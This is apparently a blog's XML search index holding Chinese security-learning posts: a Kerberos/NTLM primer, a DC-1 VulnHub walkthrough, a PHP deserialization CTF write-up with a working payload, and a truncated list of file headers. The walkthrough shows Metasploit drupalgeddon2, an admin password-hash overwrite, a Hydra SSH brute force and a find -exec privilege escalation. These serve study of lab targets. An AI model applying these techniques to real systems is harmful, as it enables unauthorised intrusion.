<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>Kerberos协议与NTLM认证</title>
    <link href="/2022/06/29/Kerberos%E5%8D%8F%E8%AE%AE%E4%B8%8ENTLM%E8%AE%A4%E8%AF%81/"/>
    <url>/2022/06/29/Kerberos%E5%8D%8F%E8%AE%AE%E4%B8%8ENTLM%E8%AE%A4%E8%AF%81/</url>
    
    <content type="html"><![CDATA[<h3 id="Kerberos协议"><a href="#Kerberos协议" class="headerlink" title="Kerberos协议"></a>Kerberos协议</h3><h5 id="简介："><a href="#简介：" class="headerlink" title="简介："></a>简介：</h5><p><strong>Kerberos</strong>是一种计算机网络授权协议，用来在非安全网络中，对个人通信以安全的手段进行身份认证。这个词又指麻省理工学院为这个协议开发的一套计算机软件。</p><h5 id="协议内容："><a href="#协议内容：" class="headerlink" title="协议内容："></a>协议内容：</h5><ul><li><p>client：需要进行认证的客户端</p></li><li><p>KDC（Key Distribution Center）&#x3D; 密钥分发中心</p></li><li><p>AS（Authentication Server）&#x3D; 认证服务器</p></li><li><p>TGS（Ticket Granting Server）&#x3D; 票据授权服务器</p></li><li><p>AD (Active Directory) &#x3D;存放client白名单和用户密码</p></li><li><p>TGT（Ticket Granting Ticket）&#x3D; 票据授权票据，票据的票据</p></li><li><p>server：提供服务的服务端</p></li></ul><p>进行验证时，AS和TGS是在KDC中的</p><h5 id="简洁的验证流程："><a href="#简洁的验证流程：" class="headerlink" title="简洁的验证流程："></a>简洁的验证流程：</h5><p>在进行Kerberos验证时，分为三步：</p><ol><li>首先我们需要client(客户端)向KDC(密钥分发中心)发送第一次请求，在KDC接受到请求后将发送过来的hash值交给AS(认证服务器)进行验证，此刻AD会验证client是否在白名单中，如果在白名单中，即AS验证成功，AS随即生成TGT(票据授权票据)。</li><li>在第一步client经过AS验证成功后，AS生成了TGT返回给了client，这是第一次验证。client在接收到TGT之后进行第二次验证，将刚刚接收到的TGT发送给KDC的TGS(票据授权服务器)进行验证，如果验证成功，TGS将会发送对应server的票据(ST)给client。</li><li>最后，经过两次验证，client已经从KDC那里拿到了server的ticket，所以最后一步，客户端只需要将得到的票据(ST)发送给Server进行效验，成功后即可访问server。</li></ol><p><img src="https://tva3.sinaimg.cn/large/007u0ID7ly1h3oyc4x7wvj31rg11pqi1.jpg" alt="11111"></p><p>​                                                                (图片来源：Y5neKO)</p><h3 id="NTLM协议"><a href="#NTLM协议" class="headerlink" title="NTLM协议"></a>NTLM协议</h3><h5 id="简介：-1"><a href="#简介：-1" class="headerlink" title="简介："></a>简介：</h5><p>NTLM 是指telnet的一种验证身份方式，即问询&#x2F;应答身份验证协议，是 Windows NT 早期版本的标准安全协议，Windows 2000 支持 NTLM 是为了保持向后兼容。Windows 2000内置三种基本安全协议之一。</p><h5 id="关键词："><a href="#关键词：" class="headerlink" title="关键词："></a>关键词：</h5><ul><li>NTLM Hash：存储在SAM数据库及NTDS数据库中对密码进行 Hash摘要计算后的结果</li><li>NTLM：除 Kerberos之外的一种网络认证协议，只支持 Windows</li><li>LSASS：Windows系统的安全机制(lsass.exe)。用于本地安全和登陆策略</li></ul><h5 id="验证流程："><a href="#验证流程：" class="headerlink" title="验证流程："></a>验证流程：</h5><p>本地认证的过程中，用户登录时，系统会将用户输入的明文密码加密成NTLM Hash，然后和SAM文件中的NTLM Hash进行比较从而完成认证，在域环境中，域内用户的密码哈希是存在域控的 NTDS.dit 文件里面的。</p><p>SAM文件是<strong>windows的用户账户数据库</strong>,所有用户的登录名及口令等相关信息都会保存在这个文件中。</p><p>SAM文件路径  C:\Windows\System32\Config\SAM</p><p>当用户注销、重启、锁屏后，操作系统会让 winlogon.exe 显示登录界面（输入框）。当 winlogon.exe 接收输入后，会将密码交给lsass进程。lsass.exe 是一个系统进程，用于微软Windows系统的安全机制。</p><p>备注：在NTLM hash之前，windows是使用LM hash验证的LM Hash其本质是使用DES加密，从windows vista和windows server2008开始 windows默认禁用LM Hash。</p>]]></content>
    
    
    
    <tags>
      
      <tag>WEB</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>DC-1靶机渗透</title>
    <link href="/2022/06/29/DC-1%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF/"/>
    <url>/2022/06/29/DC-1%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF/</url>
    
    <content type="html"><![CDATA[<h3 id="DC-1靶机渗透思路："><a href="#DC-1靶机渗透思路：" class="headerlink" title="DC-1靶机渗透思路："></a>DC-1靶机渗透思路：</h3><p>下载链接：<a href="https://www.vulnhub.com/entry/dc-1,292/">https://www.vulnhub.com/entry/dc-1,292/</a></p><p>打开虚拟机在DC-1靶机的设置中修改网络适配器为NAT模式。</p><p>记得记一下DC-1的MAC地址。</p><p>![3I5UXP35%7I7&#96;(<del>$B</del>OBVEJ](<a href="https://tva1.sinaimg.cn/large/007u0ID7ly1h3of43kqilj30nw0ru0wj.jpg">https://tva1.sinaimg.cn/large/007u0ID7ly1h3of43kqilj30nw0ru0wj.jpg</a>)</p><p>首先我们知道了拿到靶机需要拿到5个flag，然后根据每个flag的提示找到下一个flag。</p><h4 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h4><p>DC-1和kali现在属于同一个网段，我们根据靶机的MAC地址，使用nmap扫描可以找到DC-1的ip地址，然后进行端口扫描。</p><p><code>nmap -sP 192.168.140.0/24</code></p><p><code>nmap -sV -A 192.168.140.132</code></p><p><img src="https://tvax2.sinaimg.cn/large/007u0ID7ly1h3oj5u8r5wj30ia0kaqn5.jpg" alt="3BWV~%AZRBMBPI682RBSLOJ"></p><p>发现80端口开放，查看网站信息，发现是一个Drupal框架搭建的网站，使用Wappalyzer，或者查看robots.txt暴露出的信息，可以获取到Drupal的版本。</p><p><img src="https://tva4.sinaimg.cn/large/007u0ID7ly1h3oj6n41ptj317z0nqgtq.jpg" alt="JR6FVYIQ4A8373}))_4C0BL"></p><h4 id="MSF"><a href="#MSF" class="headerlink" title="MSF"></a>MSF</h4><p>在MSF中搜索，drupal利用模块进行攻击。</p><p>![0<a href="https://tva4.sinaimg.cn/large/007u0ID7ly1h3oj8q3dvmj30sa0ln1kq.jpg">BF(_@K)0PI5RZ2JL9(I)1</a></p><p>使用exploit命令执行攻击，利用drupal_drupalgeddon2</p><p><img src="https://tva1.sinaimg.cn/large/007u0ID7ly1h3oj92fhdej30s60luh9b.jpg" alt="QRTO@148N@YJ1QDC%T9EOKG"></p><p>ls可以看到 flag1.txt</p><p><img src="https://tva1.sinaimg.cn/large/007u0ID7ly1h3oj9o20avj30gc05w0x1.jpg" alt="16$IOMS}8OAN3P~SX269XKD"> flag1.txt<br>Every good CMS needs a config file - and so do you.</p><p>根据flag1的提示，我们查看CMS配置文件，Drupal的配置文件是网站根目录下的&#x2F;site&#x2F;defaultx下的setting.php文件。</p><p><img src="https://tva4.sinaimg.cn/large/007u0ID7ly1h3oj43z84sj30gr0f4n6f.jpg" alt="LRREH6N1IJ~S9$}9MFC2J{Q"></p><p>flag2：</p><p>Brute force and dictionary attacks aren’t the</p><p>only ways to gain access (and you WILL need access).</p><p>What can you do with these credentials?</p><p>翻译：</p><p>暴力和字典攻击不是</p><p>只有获得访问权限的方法（您将需要访问权限）。</p><p>您可以使用这些凭据做什么？</p><p>并且我们查看到了数据库账号密码</p><p>username：dbuser</p><p>password：R0ck3t</p><h4 id="登录数据库"><a href="#登录数据库" class="headerlink" title="登录数据库"></a>登录数据库</h4><p>使用命令shell拿到shell，然后再使用命令<code>python -c import pty; pty.spawn(&#39;/bin/bash&#39;)&quot;</code>获取一个交互式shell</p><p>![OUKDH}5X{)}DQA83&#96;%_)2M1](<a href="https://tva2.sinaimg.cn/large/007u0ID7ly1h3oj390rqij311q0lv4kj.jpg">https://tva2.sinaimg.cn/large/007u0ID7ly1h3oj390rqij311q0lv4kj.jpg</a>)</p><p>查看users表，如果pass是明文，我们就可以直接登录192.168.140.132这个网站，密文产生的脚本是&#x2F;scripts&#x2F;password-hash.sh，使用这个脚本产生123456密文，产生的密文替换数据库中admin的密文，admin用户的密码就能改成123456，完成后使用update命令更新。</p><p>![J&#96;&#96;K1F&#96;AZ(8TFV~3Z8C5@7W](<a href="https://tvax1.sinaimg.cn/large/007u0ID7ly1h3oi0457huj313m0cq49y.jpg">https://tvax1.sinaimg.cn/large/007u0ID7ly1h3oi0457huj313m0cq49y.jpg</a>)</p><h4 id="登录网站"><a href="#登录网站" class="headerlink" title="登录网站"></a>登录网站</h4><p>登录drupal，发现flag3，提示要使用find命令</p><p><img src="https://tva1.sinaimg.cn/large/007u0ID7ly1h3oj25aheij316n0kaq8o.jpg" alt="P5@8%I_~_K8YJ80Q9%PB84L"></p><h4 id="爆破ssh密码"><a href="#爆破ssh密码" class="headerlink" title="爆破ssh密码"></a>爆破ssh密码</h4><p>并且发现了flag4且打开了ssh，所以尝试使用九头蛇爆破ssh密码，得到登录密码为orange，登录之后在flag4用户的home目录中，发现flag4.txt</p><p><img src="https://tva2.sinaimg.cn/large/007u0ID7ly1h3oirmt3o0j314e0m0e81.jpg" alt="T8G@`FG@TOTDA55`L}TX5QJ"></p><p>![NH6V0PS2HJK(X)FTZZV@&#96;AQ](<a href="https://tvax3.sinaimg.cn/large/007u0ID7ly1h3oiqz1jlkj30vt0ire2h.jpg">https://tvax3.sinaimg.cn/large/007u0ID7ly1h3oiqz1jlkj30vt0ire2h.jpg</a>)</p><h4 id="find提权"><a href="#find提权" class="headerlink" title="find提权"></a>find提权</h4><p>然后使用find命令提权：</p><p>使用方法find (一个路径或文件必须存在) -exec 执行命令 （结束）;</p><p><img src="https://tva3.sinaimg.cn/large/007u0ID7ly1h3oit9dc74j30hs0f2qee.jpg" alt="G(II4(UWC3TH3881ND(GMYA"></p><p>使用命令<code>find ke1r -exec &#39;/bin/sh&#39; \;</code>最终提权至root权限，ls找到finalflag.txt</p><p><img src="https://tva1.sinaimg.cn/large/007u0ID7ly1h3oiuu31zoj30j40h1498.jpg" alt="TR(%2LI(TW3G$B7SBB6BM3T"></p>]]></content>
    
    
    
    <tags>
      
      <tag>WEB</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PHP反序列化</title>
    <link href="/2022/04/17/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <url>/2022/04/17/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    
    <content type="html"><![CDATA[<h2 id="PHP反序列化"><a href="#PHP反序列化" class="headerlink" title="PHP反序列化"></a>PHP反序列化</h2><p>序列化(serialize)就是将对象转换为字符串。反序列化(unserialize)则相反，数据的格式的转换对象的序列化利于对象的保存和传输，也可以让多个文件共享对象</p><h3 id="访问控制"><a href="#访问控制" class="headerlink" title="访问控制"></a>访问控制</h3><p>PHP 对属性或方法的<strong>访问控制</strong>，是通过在前面添加<strong>关键字</strong> public（公有），protected（受保护）或 private（私有）来实现的。<br>public（公有）：公有的类成员可以在<strong>任何地方被访问</strong>。<br>protected（受保护）：受保护的类成员则可以<strong>被其自身以及其子类和父类访问</strong>。<br>private（私有）：私有的类成员则<strong>只能被其定义所在的类访问</strong>。</p><h3 id="类"><a href="#类" class="headerlink" title="类"></a>类</h3><p>有类时会触发 <strong>魔术方法</strong></p><p>那什么时魔术方法呢？PHP中把两个下划线开头的方法称为魔术方法(Magic methods)</p><p>serialize() 函数会检查类中是否存在一个魔术方法。如果存在，该方法会先被调用，然后才执行序列化操作。</p><p><strong>魔术方法</strong>包括：</p><table><thead><tr><th>魔术方法</th><th>用处</th></tr></thead><tbody><tr><td>__construct()</td><td>实例化类时自动调用</td></tr><tr><td>__destruct()</td><td>类对象使用结束时自动调用</td></tr><tr><td>__set()</td><td>在给未定义的属性赋值时自动调用</td></tr><tr><td>__get()</td><td>调用未定义的属性时自动调用</td></tr><tr><td>__isset()</td><td>使用 isset() 或 empty() 函数时自动调用</td></tr><tr><td>__unset()</td><td>使用 unset() 时自动调用</td></tr><tr><td>__sleep()</td><td>使用 serialize 序列化时自动调用</td></tr><tr><td>__wakeup()</td><td>使用 unserialize 反序列化时自动调用</td></tr><tr><td>__call()</td><td>调用一个不存在的方法时自动调用</td></tr><tr><td>__callStatic()</td><td>调用一个不存在的静态方法时自动调用</td></tr><tr><td>__toString()</td><td>把对象转换成字符串时自动调用</td></tr><tr><td>__invoke()</td><td>当尝试把对象当方法调用时自动调用</td></tr><tr><td>__set_state()</td><td>当使用 var_export() 函数时自动调用，接受一个数组参数</td></tr><tr><td>__clone()</td><td>当使用 clone 复制一个对象时自动调用</td></tr><tr><td>__debugInfo()</td><td>使用 var_dump() 打印对象信息时自动调用</td></tr></tbody></table><p>简单的序列化：</p><p><img src="https://tva1.sinaimg.cn/large/007u0ID7ly1h1cpb3ulbkj30mz0ibjtf.jpg" alt="555"></p><p>序列化后各个字符串的含义：</p><p><img src="https://tvax4.sinaimg.cn/large/007u0ID7ly1h1cpc2mg5qj30vm0btn2n.jpg" alt="556"></p><h3 id="PHP反序列化漏洞原理"><a href="#PHP反序列化漏洞原理" class="headerlink" title="PHP反序列化漏洞原理"></a>PHP反序列化漏洞原理</h3><p>序列化和反序列化本身没有问题，但是如果<strong>反序列化的内容是用户可以控制的</strong>，且<strong>后台不正当的使用了PHP中的魔法函数</strong>，就会导致安全问题。当传给<code>unserialize()</code>的<strong>参数可控</strong>时，可以通过传入一个精心构造的序列化字符串，从而控制对象内部的变量甚至是函数。</p><h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><p><a href="%5BCTFHub%5D(https://www.ctfhub.com/#/challenge)">CTFHub中 2020-网鼎杯-青龙组-Web-AreUSerialz</a></p><p><strong>代码审计</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FileHandler</span> </span>&#123;<br><br><span class="hljs-keyword">protected</span> <span class="hljs-variable">$op</span>;<br><span class="hljs-keyword">protected</span> <span class="hljs-variable">$filename</span>;<br><span class="hljs-keyword">protected</span> <span class="hljs-variable">$content</span>;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-variable">$op</span> = <span class="hljs-string">&quot;1&quot;</span>;<br>    <span class="hljs-variable">$filename</span> = <span class="hljs-string">&quot;/tmp/tmpfile&quot;</span>;<br>    <span class="hljs-variable">$content</span> = <span class="hljs-string">&quot;Hello World!&quot;</span>;<br>    <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">process</span>();<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">process</span>(<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;op == <span class="hljs-string">&quot;1&quot;</span>) &#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">write</span>();<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;op == <span class="hljs-string">&quot;2&quot;</span>) &#123;<br>        <span class="hljs-variable">$res</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">read</span>();<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">output</span>(<span class="hljs-variable">$res</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">output</span>(<span class="hljs-string">&quot;Bad Hacker!&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">write</span>(<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;filename) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;content)) &#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strlen</span>((<span class="hljs-keyword">string</span>)<span class="hljs-variable language_">$this</span>-&gt;content) &gt; <span class="hljs-number">100</span>) &#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">output</span>(<span class="hljs-string">&quot;Too long!&quot;</span>);<br>            <span class="hljs-keyword">die</span>();<br>        &#125;<br>        <span class="hljs-variable">$res</span> = <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$this</span>-&gt;filename, <span class="hljs-variable">$this</span>-&gt;content);<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$res</span>) <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">output</span>(<span class="hljs-string">&quot;Successful!&quot;</span>);<br>        <span class="hljs-keyword">else</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">output</span>(<span class="hljs-string">&quot;Failed!&quot;</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">output</span>(<span class="hljs-string">&quot;Failed!&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">read</span>(<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-variable">$res</span> = <span class="hljs-string">&quot;&quot;</span>;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;filename)) &#123;<br>        <span class="hljs-variable">$res</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$this</span>-&gt;filename);<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$res</span>;<br>&#125;<br><br><span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">output</span>(<span class="hljs-params"><span class="hljs-variable">$s</span></span>) </span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;[Result]: &lt;br&gt;&quot;</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$s</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;op === <span class="hljs-string">&quot;2&quot;</span>)<br>        <span class="hljs-variable language_">$this</span>-&gt;op = <span class="hljs-string">&quot;1&quot;</span>;<br>    <span class="hljs-variable language_">$this</span>-&gt;content = <span class="hljs-string">&quot;&quot;</span>;<br>    <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">process</span>();<br>&#125;<br><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">is_valid</span>(<span class="hljs-params"><span class="hljs-variable">$s</span></span>) </span>&#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$s</span>); <span class="hljs-variable">$i</span>++)<br>        <span class="hljs-keyword">if</span>(!(<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$s</span>[<span class="hljs-variable">$i</span>]) &gt;= <span class="hljs-number">32</span> &amp;&amp; <span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$s</span>[<span class="hljs-variable">$i</span>]) &lt;= <span class="hljs-number">125</span>))<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>&#123;<span class="hljs-string">&#x27;str&#x27;</span>&#125;)) &#123;<br><br><span class="hljs-variable">$str</span> = (<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;str&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_valid</span>(<span class="hljs-variable">$str</span>)) &#123;<br>    <span class="hljs-variable">$obj</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$str</span>);<br>&#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>首先代码审计就是看两点，一有无漏洞，二有无可控变量。</p><p>我们发现源代码最后76行有可控变量str通过get传参，并且发现有unserialize反序列化。</p><p>我们再看到 flag.php 是在这个高亮化文件里面的，并且发现有class(类)：</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FileHandler</span> &#123;</span><br><br><span class="hljs-keyword">protected</span> <span class="hljs-variable">$op</span>;<br><span class="hljs-keyword">protected</span> <span class="hljs-variable">$filename</span>;<br><span class="hljs-keyword">protected</span> <span class="hljs-variable">$content</span>;<br></code></pre></td></tr></table></figure><p>在反序列化后，相当于重新生成了一个对像，这个对象在程序结束时 <strong>析构执行</strong>­_destruct（）&#x2F;&#x2F;第58行</p><p>如果op值为2则强制将op的值变为1，content值为空，调用<strong>process函数</strong>。&#x2F;&#x2F;第20行</p><p>如果op值为1，则进入“写”函数；如果op值为2，则进入“<strong>读”函数</strong>。</p><p>这里我们需要读取到flag.php中的答案所以需要调用“读”函数&#x2F;&#x2F;第45行</p><p>如果filename有值，则file_get_contents()函数把整个文件读入一个字符串中,如果给filename赋值为flag.php 那么我们就能读出flag了。</p><p>但是在destruct函数中进行了判断把2强制转换成了1：</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs kotlin">function __destruct() &#123;<br>    <span class="hljs-keyword">if</span>($<span class="hljs-keyword">this</span>-&gt;op === <span class="hljs-string">&quot;2&quot;</span>)<br>        $<span class="hljs-keyword">this</span>-&gt;op = <span class="hljs-string">&quot;1&quot;</span>;<br>    $<span class="hljs-keyword">this</span>-&gt;content = <span class="hljs-string">&quot;&quot;</span>;<br>    $<span class="hljs-keyword">this</span>-&gt;process();<br>&#125;<br></code></pre></td></tr></table></figure><p>所以我们这里需要知道，用三个等号时，除了两个变量的值相同外，还必须这两个变量的类型相同，而用两个等号时，只需要两个变量值相同。</p><p>我们构造payload时，构造op&#x3D;‘ 2’字符串，则op&#x3D;‘2’就不成立，此时op就成了我们自己设置的值。然后通过process()函数调用后：</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs kotlin"><span class="hljs-keyword">public</span> function process() &#123;<br>    <span class="hljs-keyword">if</span>($<span class="hljs-keyword">this</span>-&gt;op == <span class="hljs-string">&quot;1&quot;</span>) &#123;<br>        $<span class="hljs-keyword">this</span>-&gt;write();<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>($<span class="hljs-keyword">this</span>-&gt;op == <span class="hljs-string">&quot;2&quot;</span>) &#123;<br>        $res = $<span class="hljs-keyword">this</span>-&gt;read();<br>        $<span class="hljs-keyword">this</span>-&gt;output($res);<br>    &#125;<br></code></pre></td></tr></table></figure><p>因为这里为 op &#x3D;&#x3D; “2”为弱类型对比只需要值相等就能调用“读”函数。就能读出flag.php文件了。</p><p><strong>构造payload</strong></p><p><img src="https://tva2.sinaimg.cn/large/007u0ID7ly1h1cq8e03mwj30di069tab.jpg" alt="123456789"></p><p>序列化出来的payload为：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">O</span>%<span class="hljs-number">3</span>A11%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>FileHandler%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>A3%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>Bs%<span class="hljs-number">3</span>A2%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>op%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A2%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>+<span class="hljs-number">2</span>%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A8%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>filename%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A8%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>flag.php%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A7%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>content%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>BN%<span class="hljs-number">3</span>B%<span class="hljs-number">7</span>D<br></code></pre></td></tr></table></figure><p>注意这里要把protect改为public才是公有的,并且要将FileHandler用new实例化。</p>]]></content>
    
    
    
    <tags>
      
      <tag>WEB</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CTF-MISC基础知识之图片</title>
    <link href="/2022/04/05/CTF-MISC%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E7%82%B9/"/>
    <url>/2022/04/05/CTF-MISC%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E7%82%B9/</url>
    
    <content type="html"><![CDATA[<p><strong>MISC作为CTF中比较重要的一类题型，分值占比较大，为了帮助大家更好的学习MISC的做题方法，我总结了常见的图片类型中的几种题型及工具：</strong></p><ul><li><p>图片，音频，视频</p><blockquote><p>首先就是大家常见的图片分析，图片修复，图片修改长宽高，图片拼接，二维码扫描，LSB隐写等等。</p></blockquote><p>遇到图片类型的题，首先最基础的图片分析，将图片丢到winhex或者010editor中分析。分析此图片有无隐写信息或分析是否包含压缩包等。以下是总结的各类型文件的文件头：</p><blockquote><p>PNG (png)，文件头：89504E47<br>GIF (gif)，文件头：47494638<br>TIFF (tif)，文件头：49492A00<br>Windows Bitmap (bmp)，文件头：424DC001<br>CAD (dwg)，文件头：41433130<br>Adobe Photoshop (psd)，文件头：38425053<br>Rich Text Format (rtf)，文件头：7B5C727466<br>XML (xml)，文件头：3C3F786D6C<br>HTML (html)，文件头：68746D6C3E<br>Email [thorough only] (eml)，文件头：44656C69766572792D646174653A<br>Outlook Express (dbx)，文件头：CFAD12FEC5FD746F<br>Outlook (pst)，文件头：2142444E<br>旧版office MS Word&#x2F;Excel (xls.or.doc or.ppt)，文件头：D0CF11E0<br>MS Access (mdb)，文件头：5374616E64617264204A<br>WordPerfect (wpd)，文件头：FF575043<br>Adobe Acrobat (pdf)，文件头：255044462D312E<br>Quicken (qdf)，文件头：AC9EBD8F<br>ZIP Archive (zip)，文件头：504B0304<br>RAR Archive (rar)，文件头：52617221<br>Wave (wav)，文件头：57415645</p><p>JPEG 